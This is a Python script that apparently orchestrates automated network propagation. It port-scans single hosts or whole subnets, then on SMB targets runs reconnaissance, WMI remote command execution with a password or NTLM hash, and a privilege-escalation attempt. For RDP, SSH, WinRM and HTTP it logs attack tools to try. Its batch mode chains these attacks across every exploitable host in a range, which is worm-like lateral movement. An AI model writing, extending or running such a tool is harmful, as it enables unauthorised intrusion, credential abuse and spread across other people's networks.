#!/usr/bin/env python3
"""
Phase 0: Multi-Vector Orchestrator - Network Propagation Framework
Main entry point that routes to appropriate exploitation phases based on discovered ports

WORKFLOW:
1. Run REAL port scan (Phase 0)
2. Detect open ports and services
3. Route to appropriate exploit handler:
   - Port 445 open? → Phase 1 (reconnaissance) + Phase 2 (WMI execution) + Phase 5 (escalation)
   - Port 3389 open? → RDP exploitation
   - Port 22 open? → SSH exploitation
   - Port 5985 open? → WinRM exploitation
   - Else? → HTTP/web shell approach
"""

import logging
import json
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from dataclasses import asdict

logger = logging.getLogger("MultiVectorOrchestrator")
logger.setLevel(logging.INFO)


class MultiVectorOrchestrator:
    """Routes exploitation based on discovered attack vectors"""
    
    def __init__(self):
        self.scan_results = []
        self.exploitation_results = []
        
        # Try to import all exploitation modules
        try:
            from network_propagation_port_scanner import PortScanner, MultiTargetScanner, AttackVector
            self.PortScanner = PortScanner
            self.MultiTargetScanner = MultiTargetScanner
            self.AttackVector = AttackVector
            self.PORT_SCANNER_AVAILABLE = True
        except ImportError as e:
            logger.warning(f"[⚠️] Port scanner unavailable: {e}")
            self.PORT_SCANNER_AVAILABLE = False
        
        try:
            from network_propagation_scanner import SMBScanner
            self.SMBScanner = SMBScanner
            self.PHASE1_AVAILABLE = True
        except ImportError:
            logger.warning("[⚠️] Phase 1 (SMB Scanner) unavailable")
            self.PHASE1_AVAILABLE = False
        
        try:
            from network_propagation_wmi_executor import WMIExecutor, ExecutionContext, ExecutionPayload, ExecutionMethod
            self.WMIExecutor = WMIExecutor
            self.ExecutionContext = ExecutionContext
            self.ExecutionPayload = ExecutionPayload
            self.ExecutionMethod = ExecutionMethod
            self.PHASE2_AVAILABLE = True
        except ImportError:
            logger.warning("[⚠️] Phase 2 (WMI Executor) unavailable")
            self.PHASE2_AVAILABLE = False
        
        try:
            from network_propagation_privesc_agent import PrivescAgent
            self.PrivescAgent = PrivescAgent
            self.PHASE5_AVAILABLE = True
        except ImportError:
            logger.warning("[⚠️] Phase 5 (Privesc Agent) unavailable")
            self.PHASE5_AVAILABLE = False
    
    def full_propagation_chain(self, target_ip: str, 
                              domain: str = "WORKGROUP",
                              username: str = "admin",
                              ntlm_hash: Optional[str] = None,
                              password: Optional[str] = None) -> Dict:
        """
        Complete attack chain:
        Phase 0 (Port scan) → Phase 1 (Recon) → Phase 2 (Execution) → Phase 5 (Escalation)
        """
        logger.info(f"{'='*70}")
        logger.info(f"[🚀] MULTI-VECTOR PROPAGATION CHAIN INITIATED")
        logger.info(f"[🎯] Target: {target_ip}")
        logger.info(f"[⚙️] Credentials: {domain}\\{username}")
        logger.info(f"{'='*70}")
        
        chain_result = {
            'target_ip': target_ip,
            'timestamp': datetime.utcnow().isoformat(),
            'phases': {}
        }
        
        # ==================== PHASE 0: PORT SCAN ====================
        logger.info(f"\n{'[PHASE 0]':-^70}")
        logger.info("PORT SCANNING - Discover open services")
        logger.info(f"{'-'*70}")
        
        if not self.PORT_SCANNER_AVAILABLE:
            logger.error("[!] Port scanner unavailable - cannot proceed")
            return chain_result
        
        try:
            scanner = self.PortScanner(timeout=2.0, max_workers=5)
            scan_result = scanner.scan(target_ip)
            
            chain_result['phases']['port_scan'] = {
                'status': 'complete',
                'ports_scanned': scan_result.ports_scanned,
                'ports_open': scan_result.ports_open,
                'open_ports': [
                    {'port': p.port, 'service': p.service.value}
                    for p in scan_result.open_ports
                ],
                'attack_vectors': [v.value for v in scan_result.attack_vectors],
                'priority': scan_result.priority_vector.value if scan_result.priority_vector else None,
                'exploitability_score': scan_result.exploitability_score
            }
            
            logger.info(f"[✅] Port scan complete")
            logger.info(f"    Open ports: {scan_result.ports_open}/{scan_result.ports_scanned}")
            logger.info(f"    Attack vectors: {[v.value for v in scan_result.attack_vectors]}")
            logger.info(f"    Exploitability: {scan_result.exploitability_score}/100")
            
        except Exception as e:
            logger.error(f"[!] Port scan failed: {e}")
            chain_result['phases']['port_scan'] = {'status': 'failed', 'error': str(e)}
            return chain_result
        
        # Route based on discovered attack vector
        open_ports_set = {p.port for p in scan_result.open_ports}
        
        # ==================== VECTOR 1: SMB/WMI (Phase 1 & 2) ====================
        if 445 in open_ports_set:
            logger.info(f"\n{'[VECTOR 1: SMB/WMI]':-^70}")
            logger.info("Port 445 OPEN: Attempting SMB-based exploitation")
            logger.info(f"{'-'*70}")
            
            # Phase 1: Reconnaissance
            if self.PHASE1_AVAILABLE:
                logger.info("\n[PHASE 1] SMB RECONNAISSANCE & VALIDATION")
                try:
                    scanner = self.SMBScanner()
                    profile = scanner.scan_target(target_ip)
                    
                    if profile:
                        chain_result['phases']['phase1_recon'] = {
                            'status': 'complete',
                            'hostname': profile.hostname,
                            'os_version': profile.os_version,
                            'signing_required': profile.signing_enabled,
                            'null_session': profile.null_session,
                            'viability_score': profile.viability_score,
                            'accessible_shares': [s.name for s in profile.accessible_shares[:5]]
                        }
                        
                        logger.info(f"[✅] Phase 1 reconnaissance complete")
                        logger.info(f"    OS: {profile.os_version}")
                        logger.info(f"    Signing: {'REQUIRED' if profile.signing_enabled else 'NOT REQUIRED'}")
                        logger.info(f"    Viability: {profile.viability_score:.1%}")
                    else:
                        logger.warning("[!] Phase 1 scan returned no profile")
                        chain_result['phases']['phase1_recon'] = {'status': 'no_profile'}
                
                except Exception as e:
                    logger.error(f"[!] Phase 1 failed: {e}")
                    chain_result['phases']['phase1_recon'] = {'status': 'failed', 'error': str(e)}
            
            # Phase 2: Code Execution
            if self.PHASE2_AVAILABLE and (ntlm_hash or password):
                logger.info("\n[PHASE 2] WMI-BASED CODE EXECUTION")
                try:
                    executor = self.WMIExecutor(timeout=30)
                    
                    context = self.ExecutionContext(
                        target_ip=target_ip,
                        target_hostname=target_ip,
                        username=username,
                        domain=domain,
                        ntlm_hash=ntlm_hash,
                        password=password,
                        method=self.ExecutionMethod.WMIEXEC_REAL
                    )
                    
                    # Test with whoami command
                    test_payload = self.ExecutionPayload(command="whoami /all")
                    success, output = executor.execute(context, test_payload)
                    
                    chain_result['phases']['phase2_execution'] = {
                        'status': 'complete' if success else 'failed',
                        'success': success,
                        'command': 'whoami /all',
                        'output_length': len(output) if output else 0,
                        'output_preview': output[:200] if output else None
                    }
                    
                    if success:
                        logger.info(f"[✅] Phase 2 execution successful")
                        logger.info(f"    Command executed: whoami /all")
                        logger.info(f"    Output length: {len(output)} bytes")
                    else:
                        logger.warning(f"[!] Phase 2 execution failed: {output}")
                
                except Exception as e:
                    logger.error(f"[!] Phase 2 failed: {e}")
                    chain_result['phases']['phase2_execution'] = {'status': 'failed', 'error': str(e)}
            
            elif not (ntlm_hash or password):
                logger.warning("[⚠️] Phase 2 skipped: No credentials provided (NTLM hash or password)")
            
            # ==================== PHASE 5: PRIVILEGE ESCALATION ====================
            if self.PHASE5_AVAILABLE and 'phase2_execution' in chain_result['phases']:
                if chain_result['phases']['phase2_execution'].get('success', False):
                    logger.info(f"\n{'[PHASE 5]':-^70}")
                    logger.info("PRIVILEGE ESCALATION & POST-EXPLOITATION")
                    logger.info(f"{'-'*70}")
                    
                    try:
                        privesc_agent = self.PrivescAgent(timeout=30)
                        
                        # Assessment phase
                        logger.info("\n[*] Phase 5.1: Privilege Escalation Assessment")
                        assessment = privesc_agent.assess_target(target_ip, "Windows")
                        
                        chain_result['phases']['phase5_assessment'] = {
                            'status': 'complete',
                            'threat_level': assessment.get('threat_level', 0),
                            'vectors_detected': assessment.get('detected_vectors', 0),
                            'exploit_scores': assessment.get('exploit_scores', {}),
                            'assessment_possible': assessment.get('assessment_possible', False)
                        }
                        
                        logger.info(f"[✅] Phase 5.1 assessment complete")
                        logger.info(f"    Threat level: {assessment.get('threat_level', 0)}/100")
                        logger.info(f"    Vectors: {assessment.get('detected_vectors', 0)}")
                        
                        # Escalation attempt
                        logger.info("\n[*] Phase 5.2: Attempting Escalation")
                        result = privesc_agent.attempt_escalation(
                            target_ip=target_ip,
                            platform_name="Windows",
                            threat_level=assessment.get('threat_level', 0),
                            detected_vectors=assessment.get('detected_vectors', 0)
                        )
                        
                        chain_result['phases']['phase5_escalation'] = {
                            'status': result.status.value,
                            'success': result.status.value == 'SUCCESS',
                            'technique': result.technique_used,
                            'elevated_privilege': result.elevated_privilege,
                            'success_probability': result.success_probability,
                            'mitre_technique': result.mitre_technique,
                            'error_message': result.error_message
                        }
                        
                        if result.status.value == 'SUCCESS':
                            logger.info(f"[✅] Phase 5 escalation successful!")
                            logger.info(f"    Technique: {result.technique_used}")
                            logger.info(f"    Privilege: {result.elevated_privilege}")
                            logger.info(f"    Success probability: {result.success_probability:.1%}")
                        else:
                            logger.warning(f"[!] Phase 5 escalation failed: {result.status.value}")
                            if result.error_message:
                                logger.warning(f"    Error: {result.error_message}")
                    
                    except Exception as e:
                        logger.error(f"[!] Phase 5 failed: {e}")
                        chain_result['phases']['phase5_escalation'] = {'status': 'failed', 'error': str(e)}
                else:
                    logger.info("[ℹ️] Phase 5 skipped: Phase 2 execution unsuccessful")
            
            elif self.PHASE5_AVAILABLE:
                logger.info("[ℹ️] Phase 5 skipped: Phase 2 execution not performed")
        
        # ==================== VECTOR 2: RDP ====================
        elif 3389 in open_ports_set:
            logger.info(f"\n{'[VECTOR 2: RDP]':-^70}")
            logger.info("Port 3389 OPEN: RDP exploitation recommended")
            logger.info(f"    Suggested tools: psexec /rdp, rdesktop, xfreerdp")
            chain_result['phases']['rdp_vector'] = {'status': 'discovered', 'port': 3389}
        
        # ==================== VECTOR 3: SSH ====================
        elif 22 in open_ports_set:
            logger.info(f"\n{'[VECTOR 3: SSH]':-^70}")
            logger.info("Port 22 OPEN: SSH exploitation recommended")
            logger.info(f"    Suggested tools: SSH key bruteforce, SSH tunneling")
            chain_result['phases']['ssh_vector'] = {'status': 'discovered', 'port': 22}
        
        # ==================== VECTOR 4: WinRM ====================
        elif 5985 in open_ports_set or 5986 in open_ports_set:
            logger.info(f"\n{'[VECTOR 4: WinRM]':-^70}")
            logger.info("Port 5985/5986 OPEN: WinRM exploitation recommended")
            logger.info(f"    Suggested tools: evil-winrm, PSRemoting")
            chain_result['phases']['winrm_vector'] = {'status': 'discovered', 'port': 5985 if 5985 in open_ports_set else 5986}
        
        # ==================== VECTOR 5: HTTP ====================
        elif 80 in open_ports_set or 443 in open_ports_set:
            logger.info(f"\n{'[VECTOR 5: HTTP/HTTPS]':-^70}")
            logger.info("Port 80/443 OPEN: Web interface exploitation recommended")
            logger.info(f"    Suggested tools: Web shell upload, XXE, SQLi")
            chain_result['phases']['http_vector'] = {'status': 'discovered', 'port': '80/443'}
        
        else:
            logger.warning("[⚠️] No recognized attack vectors found")
            chain_result['status'] = 'no_vectors'
        
        # ==================== FINAL SUMMARY ====================
        logger.info(f"\n{'[SUMMARY]':-^70}")
        logger.info(f"Target: {target_ip}")
        logger.info(f"Ports scanned: {scan_result.ports_scanned}")
        logger.info(f"Ports open: {scan_result.ports_open}")
        logger.info(f"Attack vectors: {len(scan_result.attack_vectors)}")
        logger.info(f"Exploitability: {scan_result.exploitability_score}/100")
        
        if 'phase2_execution' in chain_result['phases']:
            if chain_result['phases']['phase2_execution']['success']:
                logger.info(f"\n[🎯] CODE EXECUTION CONFIRMED ✅")
            else:
                logger.info(f"\n[⚠️] CODE EXECUTION FAILED")
        
        logger.info(f"{'='*70}\n")
        
        return chain_result
    
    def batch_propagate(self, network_range: str,
                       domain: str = "WORKGROUP",
                       username: str = "admin",
                       ntlm_hash: Optional[str] = None,
                       password: Optional[str] = None) -> Dict:
        """Batch propagate across network range"""
        logger.info(f"[*] Batch propagation starting on {network_range}")
        
        if not self.PORT_SCANNER_AVAILABLE:
            logger.error("[!] Port scanner unavailable")
            return {}
        
        multi_scanner = self.MultiTargetScanner(timeout=2.0, max_workers=5)
        results = multi_scanner.scan_range(network_range)
        
        # Get exploitable targets
        exploitable = multi_scanner.get_exploitable_targets()
        
        logger.info(f"[+] Found {len(exploitable)} exploitable targets")
        
        batch_results = {
            'network': network_range,
            'total_scanned': len(results),
            'exploitable_targets': len(exploitable),
            'targets': []
        }
        
        for ip, scan_result in exploitable:
            logger.info(f"\n[*] Targeting {ip} (exploitability: {scan_result.exploitability_score:.1f}/100)")
            
            chain_result = self.full_propagation_chain(
                target_ip=ip,
                domain=domain,
                username=username,
                ntlm_hash=ntlm_hash,
                password=password
            )
            
            batch_results['targets'].append(chain_result)
        
        return batch_results


def main():
    import sys
    
    if len(sys.argv) < 2:
        print("Multi-Vector Orchestrator - Full Propagation Chain")
        print("\nUsage:")
        print("  Single target: python network_propagation_orchestrator.py <target_ip> [domain] [username] [ntlm_hash]")
        print("  Network range: python network_propagation_orchestrator.py <network_range> --batch [domain] [username] [ntlm_hash]")
        print("\nExamples:")
        print("  python network_propagation_orchestrator.py 192.168.1.50 WORKGROUP admin aabbccdd11223344")
        print("  python network_propagation_orchestrator.py 192.168.1.0/24 --batch WORKGROUP admin aabbccdd11223344")
        sys.exit(1)
    
    target_or_range = sys.argv[1]
    domain = sys.argv[2] if len(sys.argv) > 2 else "WORKGROUP"
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"
    ntlm_hash = sys.argv[4] if len(sys.argv) > 4 else None
    
    orchestrator = MultiVectorOrchestrator()
    
    if '--batch' in sys.argv or '/' in target_or_range:
        # Batch mode
        results = orchestrator.batch_propagate(
            network_range=target_or_range,
            domain=domain,
            username=username,
            ntlm_hash=ntlm_hash
        )
    else:
        # Single target
        results = orchestrator.full_propagation_chain(
            target_ip=target_or_range,
            domain=domain,
            username=username,
            ntlm_hash=ntlm_hash
        )
    
    # Output results
    print("\n" + "="*70)
    print("FINAL RESULTS")
    print("="*70)
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
